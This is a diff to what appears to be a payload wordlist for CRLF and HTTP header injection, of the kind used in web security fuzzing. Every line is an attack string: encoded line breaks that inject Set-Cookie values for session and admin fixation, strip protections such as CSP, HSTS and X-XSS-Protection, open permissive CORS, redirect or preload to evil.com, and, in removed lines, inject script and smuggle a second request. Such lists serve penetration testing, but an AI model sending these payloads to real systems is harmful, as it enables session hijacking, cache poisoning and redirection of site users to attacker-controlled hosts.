@@ -1,34 +1,57 @@
-%0d%0a
-%0D%0A
-\r\n
-\n
-%0a
-%0A
+%0d%0aX-Injected: header
+%0aX-Injected: header
 
-%0d%0aX-Custom-Header: injected
-%0d%0aSet-Cookie: session=evil
+X-Injected: header
+
+X-Injected: header
+%0d%0aSet-Cookie: session=malicious
+%0d%0aSet-Cookie: admin=true
+%0d%0aSet-Cookie: auth=TOKEN
+%0d%0aSet-Cookie: role=administrator
+%0d%0aSet-Cookie: csrf=bypassed
 %0d%0aContent-Type: text/html
-%0d%0aContent-Length: 0
-%0d%0aLocation: https://evil.com
-
-?url=https://evil.com%0d%0aX-Forwarded-For:%20127.0.0.1
-?redirect=/home%0d%0aX-Injected:%20header
-?page=home%0aSet-Cookie:admin=true
-
-?param=value%0d%0a%0d%0a<html><body><script>alert(1)</script></body></html>
-
-%0d%0aSet-Cookie: admin=true; path=/
-%0d%0aSet-Cookie: session=attacker_session; HttpOnly=false
-%0d%0aSet-Cookie: auth=1; expires=Fri, 01 Jan 2099 00:00:00 GMT
-
-%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
-
-username=admin%0d%0aGET / HTTP/1.1
-
-%250d%250a
-%25%30%64%25%30%61
-%u000d%u000a
-
-%c0%8d%c0%8a
-%e5%98%8d%e5%98%8a
-\u000d\u000a
+%0d%0aContent-Length: 50
+%0d%0aContent-Type: application/json
+%0d%0aAccess-Control-Allow-Origin: *
+%0d%0aAccess-Control-Allow-Credentials: true
+%0d%0aAccess-Control-Allow-Methods: GET, POST, DELETE
+%0d%0aAccess-Control-Allow-Headers: *
+%0d%0aAccess-Control-Expose-Headers: *
+%0d%0aCross-Origin-Resource-Policy: cross-origin
+%0d%0aCross-Origin-Embedder-Policy: unsafe-none
+%0d%0aX-Frame-Options: ALLOW
+%0d%0aX-XSS-Protection: 0
+%0d%0aX-Content-Type-Options: none
+%0d%0aContent-Security-Policy: default-src *
+%0d%0aStrict-Transport-Security: max-age=0
+%0d%0aPublic-Key-Pins: max-age=0
+%0d%0aX-Powered-By: injected
+%0d%0aServer: injected
+%0d%0aVia: injected
+%0d%0aProxy-Authenticate: injected
+%0d%0aWWW-Authenticate: injected
+%0d%0aRetry-After: 0
+%0d%0aLink: <http://evil.com>; rel=preload
+%0d%0aRefresh: 0; url=http://evil.com
+%0d%0aP3P: CP="ALL"
+%0d%0aX-Custom: injected value
+%0d%0aX-Forwarded-For: 127.0.0.1
+%0d%0aX-Real-IP: 127.0.0.1
+%0d%0aX-Auth-Token: FAKE
+%0d%0aAuthorization: Bearer FAKE
+%0d%0aHost: evil.com
+%0d%0aOrigin: http://evil.com
+%0d%0aReferer: http://evil.com
+%0d%0aUser-Agent: injected bot
+%0d%0aCache-Control: no-store
+%0d%0aPragma: injected
+%0d%0aExpires: Thu, 01 Jan 2099 00:00:00 GMT
+%0d%0aLast-Modified: Thu, 01 Jan 2099 00:00:00 GMT
+%0d%0aETag: injected
+%0d%0aAllow: GET, POST, PUT, DELETE, PATCH, OPTIONS, TRACE
+%0d%0aTransfer-Encoding: chunked
+%0d%0aConnection: keep-alive
+%0d%0aKeep-Alive: timeout=999
+%0d%0aUpgrade: h2c
+%0d%0aTrailer: injected
+%0d%0aTE: trailers
